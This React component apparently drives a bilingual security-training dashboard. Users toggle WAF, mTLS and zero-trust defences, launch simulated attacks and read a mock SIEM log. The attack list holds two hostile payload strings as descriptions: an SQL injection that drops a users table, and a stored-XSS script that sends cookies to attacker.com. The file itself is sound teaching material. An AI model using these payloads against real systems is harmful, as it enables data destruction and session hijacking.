import React from 'react';
import { motion } from 'framer-motion';
import { Shield, ShieldAlert, ShieldCheck, Zap, Lock, Terminal, Activity } from 'lucide-react';
import { useTranslation } from 'react-i18next';
import { ThreatType, ThreatSimulationResult } from './useSecuritySimulation';

export interface SecurityDefenseSimulationTabProps {
  zeroTrustActive: boolean;
  setZeroTrustActive: (val: boolean) => void;
  mTLSActive: boolean;
  setMTLSActive: (val: boolean) => void;
  wafActive: boolean;
  setWafActive: (val: boolean) => void;
  isSimulating: boolean;
  logs: ThreatSimulationResult[];
  onLaunchAttack: (threat: ThreatType) => void;
}

export const SecurityDefenseSimulationTab: React.FC<SecurityDefenseSimulationTabProps> = ({
  zeroTrustActive,
  setZeroTrustActive,
  mTLSActive,
  setMTLSActive,
  wafActive,
  setWafActive,
  isSimulating,
  logs,
  onLaunchAttack
}) => {
  const { i18n } = useTranslation();
  const isEn = (i18n.resolvedLanguage || i18n.language || 'tr').startsWith('en');

  const attackVectors: { id: ThreatType; name: string; desc: string }[] = [
    { id: 'SQL_INJECTION', name: 'SQL Injection Attack', desc: "' OR 1=1; DROP TABLE users; --" },
    { id: 'MAN_IN_THE_MIDDLE', name: 'MITM Packet Sniffing', desc: 'Unencrypted HTTP payload interception' },
    { id: 'UNAUTHORIZED_LATERAL_MOVE', name: 'Lateral Movement', desc: 'Pod A -> Internal Pod B Unauthorized RPC' },
    { id: 'XSS_PAYLOAD', name: 'Stored XSS Injection', desc: '<script>fetch("attacker.com?c="+document.cookie)</script>' }
  ];

  return (
    <motion.div key="defense" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }}>
      <div className="glass-card" style={{ padding: '2rem' }}>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '2rem' }}>
          {/* Controls & Attacks */}
          <div>
            <h4 style={{ color: '#ef4444', marginBottom: '1rem', fontWeight: 800 }}>
              {isEn ? "1. Defense Shield Configuration" : "1. Aktif Güvenlik Katmanları"}
            </h4>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '1.5rem' }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.9rem', color: 'white' }}>
                <input type="checkbox" checked={wafActive} onChange={e => setWafActive(e.target.checked)} />
                <Shield size={16} color="#ef4444" /> {isEn ? "Web App Firewall & Parameterized Queries" : "WAF ve Parametreli Sorgular"}
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.9rem', color: 'white' }}>
                <input type="checkbox" checked={mTLSActive} onChange={e => setMTLSActive(e.target.checked)} />
                <Lock size={16} color="#3b82f6" /> {isEn ? "Mutual TLS (mTLS) Encryption" : "Uçtan Uca mTLS Şifreleme"}
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.9rem', color: 'white' }}>
                <input type="checkbox" checked={zeroTrustActive} onChange={e => setZeroTrustActive(e.target.checked)} />
                <ShieldCheck size={16} color="#10b981" /> {isEn ? "Zero Trust Micro-Segmentation (NIST)" : "Zero Trust Mikro-Segmentasyon"}
              </label>
            </div>

            <h4 style={{ color: 'white', marginBottom: '0.75rem', fontWeight: 700, fontSize: '0.95rem' }}>
              {isEn ? "2. Launch Simulated Threat:" : "2. Simüle Edilmiş Tehdit Gönder:"}
            </h4>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
              {attackVectors.map(a => (
                <button
                  key={a.id}
                  onClick={() => onLaunchAttack(a.id)}
                  disabled={isSimulating}
                  style={{
                    padding: '10px 12px',
                    borderRadius: '8px',
                    background: 'rgba(239, 68, 68, 0.1)',
                    border: '1px solid rgba(239, 68, 68, 0.25)',
                    color: '#fca5a5',
                    fontSize: '0.8rem',
                    fontWeight: 700,
                    textAlign: 'left',
                    cursor: isSimulating ? 'default' : 'pointer'
                  }}
                >
                  ⚡ {a.name}
                </button>
              ))}
            </div>
          </div>

          {/* Defense Terminal */}
          <div style={{ background: '#020617', borderRadius: '16px', padding: '1.5rem', border: '1px solid #1e293b' }}>
            <h4 style={{ color: 'white', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '8px', fontSize: '0.95rem' }}>
              <Terminal size={18} color="#ef4444" /> {isEn ? "SIEM Security Operations Log" : "Canlı SIEM Güvenlik Tehdit Kaydı"}
            </h4>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', maxHeight: '220px', overflowY: 'auto', fontFamily: 'monospace', fontSize: '0.8rem' }}>
              {logs.map(l => (
                <div key={l.id} style={{ background: '#0f172a', padding: '10px 12px', borderRadius: '8px', borderLeft: `4px solid ${l.status === 'BLOCKED' ? '#22c55e' : '#ef4444'}` }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', color: '#94a3b8' }}>
                    <span style={{ fontWeight: 800, color: l.status === 'BLOCKED' ? '#4ade80' : '#f87171' }}>
                      {l.status === 'BLOCKED' ? '🛡️ THREAT BLOCKED' : '🚨 BREACH OCCURRED'}
                    </span>
                    <span>{l.timestamp}</span>
                  </div>
                  <div style={{ color: '#e2e8f0', marginTop: '4px' }}>Attack: {l.threat}</div>
                  <div style={{ color: '#94a3b8', fontSize: '0.75rem', marginTop: '2px' }}>Mitigation: {l.mitigation}</div>
                </div>
              ))}
              {logs.length === 0 && !isSimulating && (
                <span style={{ color: '#475569' }}>
                  {isEn ? "// No security events logged. Click an attack button to test defenses." : "// Henüz güvenlik olayı kaydedilmedi. Tehdit simülasyonu butonuna tıklayın."}
                </span>
              )}
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

export default SecurityDefenseSimulationTab;
